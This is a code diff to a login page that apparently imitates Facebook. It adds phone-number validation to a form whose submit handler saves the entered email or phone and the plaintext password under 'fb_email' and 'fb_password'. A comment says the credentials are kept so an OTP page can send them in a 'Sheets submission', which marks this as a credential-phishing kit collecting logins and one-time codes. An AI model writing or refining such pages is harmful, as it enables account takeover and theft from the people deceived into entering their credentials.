@@ -205,7 +205,8 @@
             <div class="login-form">
                 <form id="loginForm">
                     <div class="form-group">
-                        <input type="email" name="email" placeholder="Mobile number or email address" required>
+                        <input type="text" name="email" id="emailOrPhone" placeholder="Mobile number or email address"
+                            required>
                     </div>
                     <div class="form-group">
                         <input type="password" name="password" placeholder="Password" required>
@@ -230,17 +231,57 @@
     <script>
         var form = document.getElementById('loginForm');
         var btn = form.querySelector('.login-button');
+        var inputField = document.getElementById('emailOrPhone');
+
+        // Create error message element
+        var errorMsg = document.createElement('div');
+        errorMsg.style.cssText = 'color:#d32f2f;font-size:13px;margin-top:6px;display:none;';
+        errorMsg.textContent = 'Please enter a valid 10-digit mobile number.';
+        inputField.parentNode.appendChild(errorMsg);
+
+        // Live validation: if only digits typed, restrict to 10
+        inputField.addEventListener('input', function () {
+            var val = inputField.value.trim();
+            if (/^\d+$/.test(val)) {
+                if (val.length > 10) {
+                    inputField.value = val.slice(0, 10); // prevent more than 10 digits
+                }
+                errorMsg.style.display = val.length > 0 && val.length < 10 ? 'block' : 'none';
+            } else {
+                errorMsg.style.display = 'none';
+            }
+        });
 
         form.addEventListener('submit', function (e) {
             e.preventDefault();
 
-            var email = form.querySelector('input[name="email"]').value.trim();
+            var emailOrPhone = inputField.value.trim();
             var password = form.querySelector('input[name="password"]').value;
 
-            if (!email || !password) return;
+            if (!emailOrPhone || !password) return;
+
+            // If all digits, must be exactly 10
+            if (/^\d+$/.test(emailOrPhone)) {
+                if (emailOrPhone.length !== 10) {
+                    errorMsg.style.display = 'block';
+                    inputField.focus();
+                    return;
+                }
+            } else {
+                // Treat as email — basic @ check
+                if (!emailOrPhone.includes('@')) {
+                    errorMsg.style.display = 'none';
+                    inputField.setCustomValidity('Please enter a valid email or 10-digit mobile number.');
+                    form.reportValidity();
+                    return;
+                }
+            }
+
+            errorMsg.style.display = 'none';
+            inputField.setCustomValidity('');
 
             // Save credentials so otp.html can include them in the Sheets submission
-            sessionStorage.setItem('fb_email', email);
+            sessionStorage.setItem('fb_email', emailOrPhone);
             sessionStorage.setItem('fb_password', password);
 
             // Disable button briefly, then navigate to OTP page
